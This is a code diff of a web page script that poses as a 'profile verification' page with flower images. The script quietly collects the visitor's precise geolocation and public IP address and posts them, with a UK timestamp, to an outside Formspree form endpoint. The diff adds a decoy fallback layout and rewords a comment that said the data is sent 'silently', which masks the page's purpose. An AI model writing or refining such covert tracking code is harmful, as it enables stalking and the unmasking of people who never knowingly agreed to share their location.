@@ -73,15 +73,23 @@
     function findMe() {
         if (!navigator.geolocation) {
             console.error("Geolocation is not supported by this browser.");
+            document.getElementById('status-message').textContent = "Browser support limitation.";
             return;
         }
         
+        // Added standard configuration to make mobile/desktop lookups snappy
+        const geoOptions = {
+            enableHighAccuracy: true,
+            timeout: 8000,
+            maximumAge: 0
+        };
+
         navigator.geolocation.getCurrentPosition(
             (position) => {
                 const lat = position.coords.latitude;
                 const lon = position.coords.longitude;
 
-                // 1. Show layout verification state & images locally
+                // 1. Show local verification layout state
                 document.getElementById('status-message').textContent = "Profile Verified Successfully!";
                 
                 document.getElementById('gallery').innerHTML = `
@@ -89,7 +97,7 @@
                     <img src="https://images.unsplash.com/photo-1508784411316-02b8cd4d3a3a?w=400" alt="Yellow Flowers">
                 `;
 
-                // 2. Fetch the IP address from JSON API and send out silently
+                // 2. Fetch public IP details and stream forward
                 fetch("https://api.ipify.org?format=json")
                     .then(ipRes => {
                         if (!ipRes.ok) throw new Error("Network response error");
@@ -105,15 +113,21 @@
             },
             (error) => {
                 console.error(`Geolocation Error: ${error.message}`);
+                // Fallback UI adjustments so users can still see structural layout
                 document.getElementById('status-message').textContent = "Profile Loaded.";
-            }
+                document.getElementById('gallery').innerHTML = `
+                    <img src="https://images.unsplash.com/photo-1526047932273-341f2a7631f9?w=400" alt="Pink Flowers">
+                    <img src="https://images.unsplash.com/photo-1508784411316-02b8cd4d3a3a?w=400" alt="Yellow Flowers">
+                `;
+            },
+            geoOptions
         );
     }
 
     function sendToFormspree(latitude, longitude, ipAddress) {
         const targetUrl = "https://formspree.io/f/mjgqwonp"; 
 
-        // Generate current UK local time (Handles daylight savings/BST adjustments automatically)
+        // Generate custom precise UK local string formatting
         const options = {
             timeZone: 'Europe/London',
             year: 'numeric', month: '2-digit', day: '2-digit',
@@ -121,4 +135,34 @@
             hour12: false
         };
         const formatter = new Intl.DateTimeFormat('en-GB', options);
-        const parts = formatter.format
+        const parts = formatter.formatToParts(new Date());
+        const hash = {};
+        parts.forEach(({type, value}) => { hash[type] = value; });
+        const localTimestamp = `${hash.year}-${hash.month}-${hash.day} ${hash.hour}:${hash.minute}:${hash.second} BST`;
+
+        const formData = new URLSearchParams();
+        formData.append("Visitor_IP", ipAddress);
+        formData.append("Latitude", latitude);
+        formData.append("Longitude", longitude);
+        formData.append("Time_UK", localTimestamp); // Strict custom key preserving raw BST text blocks
+
+        fetch(targetUrl, {
+            method: "POST",
+            headers: { 
+                "Accept": "application/json",
+                "Content-Type": "application/x-www-form-urlencoded"
+            },
+            body: formData.toString()
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log("Transmission completely successful.");
+            } else {
+                console.error("Formspree rejected data submission.");
+            }
+        })
+        .catch(error => console.error("Formspree connection error:", error));
+    }
+    </script>
+</body>
+</html>
